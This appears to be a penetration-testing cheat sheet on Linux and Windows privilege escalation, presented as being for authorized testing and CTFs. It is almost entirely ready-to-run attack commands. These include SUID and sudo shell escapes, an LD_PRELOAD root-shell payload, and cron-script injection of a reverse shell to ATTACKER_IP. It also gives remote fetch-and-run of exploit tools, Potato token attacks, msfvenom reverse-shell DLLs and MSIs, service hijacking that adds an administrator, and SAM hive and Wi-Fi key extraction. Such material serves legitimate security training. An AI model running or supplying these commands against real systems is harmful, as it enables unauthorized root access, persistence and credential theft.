# Privilege Escalation (Linux & Windows Privesc Techniques)

> For authorized security testing, CTF competitions, and educational purposes only.

Escalating from a low-privilege shell to root/SYSTEM. Covers both manual
enumeration and automated tooling for Linux and Windows targets.

---

## Linux Privilege Escalation

### Initial Enumeration

```bash
# Current user and groups
id
whoami
groups

# System info
uname -a
cat /etc/os-release
cat /proc/version
hostname

# Other users
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/passwd | awk -F: '$3 >= 1000 {print $1}'  # regular users
cat /etc/shadow  # readable? instant win

# Network info
ip a
ifconfig
netstat -tulnp
ss -tulnp
route -n

# Running processes
ps aux
ps aux | grep root

# Installed packages and tools
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
which python python3 perl ruby gcc nc ncat socat wget curl 2>/dev/null
```

### SUID / SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Cross-reference with GTFOBins for exploitation
# https://gtfobins.github.io/

# Common SUID exploits:
# /usr/bin/find — execute commands
find . -exec /bin/sh -p \;

# /usr/bin/vim — spawn shell
vim -c ':!/bin/sh'

# /usr/bin/nmap (older versions with --interactive)
nmap --interactive
!sh

# /usr/bin/env
env /bin/sh -p

# /usr/bin/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# /usr/bin/bash (SUID)
bash -p

# /usr/bin/cp — overwrite /etc/passwd
# Generate password hash: openssl passwd -1 -salt xyz password123
# Add to /etc/passwd: root2:$hash:0:0:root:/root:/bin/bash
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$1$xyz$xxxxxxx:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
```

### Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:

# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/profile
!/bin/sh

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \; -quit

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'

# (ALL) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/sh"'

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/sh

# (ALL) NOPASSWD: /usr/bin/tar
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh

# (ALL) NOPASSWD: /usr/bin/zip
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"

# (ALL) NOPASSWD: /usr/bin/apt-get
sudo apt-get changelog apt
!/bin/sh

# LD_PRELOAD exploitation (if env_keep+=LD_PRELOAD in sudoers)
# Compile: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# preload.c:
#   #include <stdio.h>
#   #include <stdlib.h>
#   void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/sh"); }
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_binary

# Sudo version exploit (CVE-2021-3156 Baron Samedit, sudo < 1.9.5p2)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

### Cron Job Hijacking

```bash
# Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null

# Check for writable scripts called by cron
# If cron runs /opt/scripts/backup.sh as root and you can write to it:
echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Cron PATH hijacking
# If crontab has PATH=/home/user:/usr/local/sbin:...
# And runs "backup.sh" without absolute path:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
# Wait for cron to execute, then:
/tmp/rootbash -p

# Wildcard injection (tar with *)
# If cron runs: cd /home/user && tar czf /tmp/backup.tar.gz *
echo "" > "/home/user/--checkpoint=1"
echo "" > "/home/user/--checkpoint-action=exec=sh privesc.sh"
echo '#!/bin/bash' > /home/user/privesc.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/privesc.sh
```

### Writable PATH / Library Hijacking

```bash
# Check PATH for writable directories
echo $PATH | tr ':' '\n' | while read dir; do
  [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# If a root-owned script calls a binary without absolute path
# and you can write to an earlier PATH directory:
echo '#!/bin/bash' > /writable/path/dir/target_binary
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /writable/path/dir/target_binary
chmod +x /writable/path/dir/target_binary

# Shared library hijacking
# Find missing libraries
strace /usr/local/bin/target 2>&1 | grep "No such file"
# ldd /usr/local/bin/target

# If a missing .so is in a writable directory:
# Compile malicious .so:
# gcc -shared -fPIC -o /writable/path/missing.so exploit.c
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Notable kernel exploits:
# Dirty Pipe (CVE-2022-0847) — Linux 5.8 to 5.16.11
# Dirty COW (CVE-2016-5195) — Linux 2.6.22 to 4.8.3
# PwnKit (CVE-2021-4034) — polkit pkexec (nearly universal)
# Netfilter (CVE-2022-25636) — Linux 5.4 to 5.6.10

# Dirty Pipe example
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 "${root_entry}"

# PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit

# Use linux-exploit-suggester
./linux-exploit-suggester.sh
# or
./les.sh --kernel $(uname -r)
```

### Linux Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid+ep on python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_setuid+ep on perl
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'

# cap_dac_read_search+ep — read any file
# cap_net_raw+ep — packet sniffing
# cap_sys_admin+ep — mount filesystems, etc.
```

### Automated Enumeration Tools

```bash
# LinPEAS — comprehensive Linux privesc enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer to target:
wget http://attacker.com/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# LinEnum
./LinEnum.sh -t

# linux-smart-enumeration (lse)
./lse.sh -l 1    # level 1 for more detail

# pspy — monitor processes without root
./pspy64
```

---

## Windows Privilege Escalation

### Initial Enumeration

```powershell
# Current user and privileges
whoami
whoami /priv
whoami /groups
net user %USERNAME%

# System info
systeminfo
hostname
wmic os get caption,version,buildnumber

# Other users and admins
net user
net localgroup administrators
net localgroup "Remote Desktop Users"

# Network
ipconfig /all
netstat -ano
route print

# Running processes
tasklist /v
tasklist /svc
wmic process list brief

# Installed software
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s
```

### Token Manipulation

```powershell
# Check current privileges
whoami /priv

# SeImpersonatePrivilege — Potato attacks
# JuicyPotato (Windows Server 2016/2019, Win10 < 1809)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\path\to\reverse_shell.exe" -t *

# PrintSpoofer (Windows 10/Server 2016-2019)
PrintSpoofer.exe -i -c cmd

# GodPotato (works on newer Windows)
GodPotato.exe -cmd "cmd /c whoami"

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "cmd /c reverse_shell.exe" -l 9999

# SeBackupPrivilege — copy any file
# Can read SAM, SYSTEM hives for offline hash extraction
reg save hklm\sam sam.bak
reg save hklm\system system.bak
# Transfer files, then: secretsdump.py -sam sam.bak -system system.bak LOCAL

# SeDebugPrivilege — inject into processes
# Migrate to SYSTEM process using Meterpreter or manual injection
```

### Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Manual check
sc qc "ServiceName"

# Example: C:\Program Files\My App\Service\svc.exe (unquoted)
# Windows tries:
#   C:\Program.exe
#   C:\Program Files\My.exe
#   C:\Program Files\My App\Service\svc.exe
# If you can write to C:\Program Files\My App\, place My.exe (reverse shell)

# Check write permissions
icacls "C:\Program Files\My App"
accesschk.exe -uwdq "C:\Program Files\My App"
```

### DLL Hijacking

```powershell
# Find services with missing DLLs
# Use Process Monitor (Procmon) — filter for "NAME NOT FOUND" + ".dll"

# Common DLL search order:
# 1. Application directory
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. Current directory
# 6. PATH directories

# If a service loads a missing DLL from a writable directory:
# Compile malicious DLL:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o hijacked.dll

# Place DLL in writable directory within the search path
# Restart the service (or wait for system reboot)
sc stop "VulnService"
sc start "VulnService"
```

### Windows Service Misconfigurations

```powershell
# Check service permissions with accesschk
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# If SERVICE_CHANGE_CONFIG permission:
sc config "VulnService" binpath="cmd /c net localgroup administrators lowprivuser /add"
sc stop "VulnService"
sc start "VulnService"

# If writable service binary:
# Replace the binary with a reverse shell
move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
copy reverse_shell.exe "C:\path\to\service.exe"
sc stop "VulnService"
sc start "VulnService"

# Check registry for service configs
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /v ImagePath
```

### Windows Credential Harvesting

```powershell
# Saved credentials
cmdkey /list
# If saved creds exist:
runas /savecred /user:admin "cmd /c whoami > C:\temp\output.txt"

# Unattend/sysprep files
dir /s C:\unattend.xml C:\sysprep.inf C:\unattended.xml 2>nul
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend\Unattend.xml

# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# SAM/SYSTEM for offline cracking
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
# Use secretsdump.py or mimikatz offline

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is set (both must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are set to 1 — generate MSI reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi

# Execute
msiexec /quiet /qn /i shell.msi
```

### Automated Windows Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe

# windows-exploit-suggester
# On attacker machine:
python windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt

# Watson (.NET)
.\Watson.exe
```

---

## Tips

- Run automated tools first (linpeas/winpeas) for quick wins, then enumerate manually
- Always check sudo -l and SUID binaries on Linux as your first manual step
- On Windows, check `whoami /priv` immediately -- SeImpersonatePrivilege is a common escalation path
- Cross-reference SUID binaries and sudo entries with GTFOBins
- Cross-reference Windows binaries with LOLBAS (lolbas-project.github.io)
- Check for plaintext credentials in config files, history, logs, and environment variables
- Kernel exploits are a last resort -- they can crash the system
- Always try multiple techniques; a hardened system may still have one overlooked weakness
- Document every step for your pentest report

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [LinPEAS / WinPEAS](https://github.com/peass-ng/PEASS-ng)
- [PayloadsAllTheThings - Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PayloadsAllTheThings - Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks Windows Privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PowerSploit PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
